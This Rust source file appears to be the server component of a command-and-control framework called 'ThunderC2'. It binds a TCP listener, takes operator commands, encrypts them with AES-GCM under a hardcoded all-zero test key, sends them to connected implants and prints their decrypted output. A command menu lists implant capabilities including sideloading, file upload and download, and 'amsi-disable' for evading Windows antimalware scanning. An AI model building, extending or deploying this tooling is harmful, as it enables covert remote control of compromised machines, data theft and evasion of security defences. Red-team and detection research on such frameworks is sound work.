
// module containing functions to instpect various aspects of environment including processing args. 
//use std::env;

// Imports for Server & client function
use std::thread;
use std::net::{TcpListener, TcpStream, Shutdown};
// user input
use std::io::{Read, Write};

// For OS commands
//use std::process::{Command, Stdio};

//For encryption
use aes_gcm::{aead::{Aead, AeadCore, KeyInit, OsRng}, Aes256Gcm};

//using new Engine , decode/encode depriciated
//use base64::{encode, decode};
use base64::{engine::general_purpose, Engine as _};

//for encryption
use lazy_static::lazy_static;
use std::sync::Mutex;
//use aes_gcm::Nonce;

//use std::fmt::format;
use std::string::String;

// Validate IPV4 address
//use std::net::{IpAddr,Ipv4Addr};

//for user input
use inquire::Text;


// Define a fixed 32-byte key (for testing only)
const FIXED_KEY: [u8; 32] = [0; 32];

lazy_static! {
    static ref AES_KEY: Mutex<[u8; 32]> = Mutex::new(FIXED_KEY);
}


// lazy_static! {
//     // turns out i only need the key in static
//     static ref AES_KEY: Mutex<[u8; 32]> = Mutex::new(Aes256Gcm::generate_key(OsRng).into());
//     //static ref NONCE: Mutex<[u8; 12]> = Mutex::new(Aes256Gcm::generate_nonce(&mut OsRng).into());
// }

pub fn server_main() {


    println!("");
    println!("Starting ThunderC2.⚡.⚡.⛈️");
    println!("Enter ipv4 listen address: ");
    let ip = Text::new("IP:").prompt();
    let port = Text::new("Port:").prompt();
    let addr = format!("{}:{}", ip.unwrap(), port.unwrap());
    //println!("{}", addr);
    server(addr);


    /*  
        //println!("Hello, world!");

        // use collect() to turn the iterator into a vector containing all the values produced by the iterator. 
        let args: Vec<String> = env::args().collect();

        // print the vector using the debug macro
        //dbg!(args);
        
        if args.len() < 2 {
            println!("<!> args accepts 'server' or 'client'");
            return;
        }

        // Here we will match either 'server' or 'client' input and direct to new functions accordingly.

        // args[0] in rust is reserved for the program name or path. 
        match args[1].as_str() {
            "server" => server(),
            "client" => client(),
            _ => println!("<!> args accept 'server' or 'client'"),
        }
    */
    
}





fn server(a: String) {


    
    // // user input on same line as print
    // //print!("Enter ipv4 listen address: ");
    // io::stdout().flush().unwrap();
    // let mut ip = String::new();
    // io::stdin().read_line(&mut ip).expect("Failed to read line");
    
    // // remove trailing new line
    // ip.pop();
    
    // // user input on same line as print
    // print!("Enter listen port: ");
    // io::stdout().flush().unwrap();
    // let mut port = String::new();
    // io::stdin().read_line(&mut port).expect("Failed to read line");

    // // remove trailing new line
    // port.pop();
    

    //let address = format!("{}:{}",ip , port);

    //dbg!(&a);

    let listener = TcpListener::bind(&a).unwrap();

    println!("Server up on {:?}", a);
    // accept connections and process them serially
    for stream in listener.incoming() {

        match stream{

            Ok(stream) => {
                
                // Returns the socket address of the remote peer of this TCP connection.
                println!("New connection: {}", stream.peer_addr().unwrap());

                // Creating a thread.
                // inported std::thread
                // Threads are ment to communicate with channels. 
                // using 'move ||' gives ownership of values to a thread. 
                thread::spawn(move|| {
                    handle_client(stream)
                }); 

            }
            Err(e) => {

                println!("Error: {}", e);
                // connection failed 
            }
        }
        
    }
    // close the socket 
    // Outside of the loop
    drop(listener);
}

fn handle_client(mut stream: TcpStream) {
    println!(">> Connected to the client.");

    loop {
        
        //let mut input = String::new();
        let mut input = Text::new(".> Send a command to the client:").prompt();
        
        //println!(".> Send a command to the client: ");

        
        // fix to inquire input
        //if let Err(e) = io::stdin().read_line(&mut input) {
        if let Err(e) = &mut input {
            println!("!> Failed to read input: {}", e);
            continue;
        }

        let command = input.unwrap();

        if command.is_empty() {
            continue;
        }
        if command.eq_ignore_ascii_case("exit") {
            println!(".> exit sent. Closing connection.");
            break;
        }
        if command.eq_ignore_ascii_case("command") {
            list_cmds();
            continue;
        }

        //println!("DEBUG");
        //dbg!(command);
        let encrypted = encrypt(&command);

        // Send length first (4 bytes, big-endian)
        let length_bytes = (encrypted.len() as u32).to_be_bytes();
        if let Err(e) = stream.write_all(&length_bytes) {
            println!("!> Failed to send length: {}", e);
            break;
        }

        // Send the encrypted command
        if let Err(e) = stream.write_all(encrypted.as_bytes()) {
            println!("!> Failed to send command: {}", e);
            break;
        }
        println!(".> Sent command: '{}'", command);

        // Instead of reading some data first, directly read the 4-byte length prefix
        let mut length_buf = [0u8; 4];
        if let Err(e) = stream.read_exact(&mut length_buf) {
            println!("!> Failed to read response length: {}", e);
            break;
        }

        let expected_len = u32::from_be_bytes(length_buf) as usize;
        if expected_len == 0 {
            println!("!> Received 0-length response. Exiting.");
            break;
        }

        // Now read exactly the expected number of bytes for the response
        let mut base64_buf = vec![0u8; expected_len];
        if let Err(e) = stream.read_exact(&mut base64_buf) {
            println!("!> Error reading base64 response data: {}", e);
            break;
        }

        // Convert the received bytes to a string
        let encrypted_str = match String::from_utf8(base64_buf) {
            Ok(s) => s,
            Err(_) => {
                println!("!> Received invalid UTF-8 from client.");
                continue;
            }
        };

        // Attempt to decrypt the response
        let output_decrypted = decrypt(&encrypted_str);
        //println!("DEBUGGING: printing output_decrypted");
        //dbg!(&output_decrypted);
        println!("{}", output_decrypted.trim());
    }

    if let Err(e) = stream.shutdown(Shutdown::Both) {
        println!("!> Error shutting down connection: {}", e);
    }
}


fn encrypt(command: &str) -> String {

    let cmd_plain = command.as_bytes();

    let key = AES_KEY.lock().unwrap();
    let cipher = Aes256Gcm::new((&*key).into());

    let nonce_bytes: [u8; 12] = Aes256Gcm::generate_nonce(&mut OsRng).into();

    let ciphertext = cipher.encrypt(&nonce_bytes.into(), cmd_plain.as_ref()).expect("Cant encrypt the msg!");

    let mut combined = Vec::new();
    combined.extend_from_slice(&nonce_bytes);
    combined.extend_from_slice(&ciphertext);

    let fake2 = general_purpose::STANDARD.encode(combined);
    
    return fake2.to_string();

}

fn decrypt(ciphertext_b64: &str) -> String {

    let key = AES_KEY.lock().unwrap();
    let cipher = Aes256Gcm::new((&*key).into());

    let combined = general_purpose::STANDARD.decode(ciphertext_b64).expect("Failed to decode base64!");

    // the first 12 bytes are the nonce
    let (nonce_bytes, ciphertext) = combined.split_at(12);

    let plaintext = cipher.decrypt(nonce_bytes.into(), ciphertext).expect("Decryption Failed!");

    let fake = String::from_utf8(plaintext).expect("Invalid UTF-8");

    return fake.to_string();

    // let cipher = Aes256Gcm::new((&*AES_KEY.lock().unwrap()).into());

    // let binding = NONCE.lock().unwrap();
    // let nonce = Nonce::from_slice(&*binding);
    
    // let ciphertext = decode(ciphertext_b64).expect("Failed to decode base64");

    // let plaintext = cipher.decrypt(nonce, ciphertext.as_ref()).expect("Decryption failed!");

    // let fake = String::from_utf8(plaintext).expect("Invalid UTF-8");
    // return fake.to_string();


}

fn list_cmds() {
    println!("sleep");
    println!("sideload");
    println!("download");
    println!("upload");
    println!("amsi-disable");
}


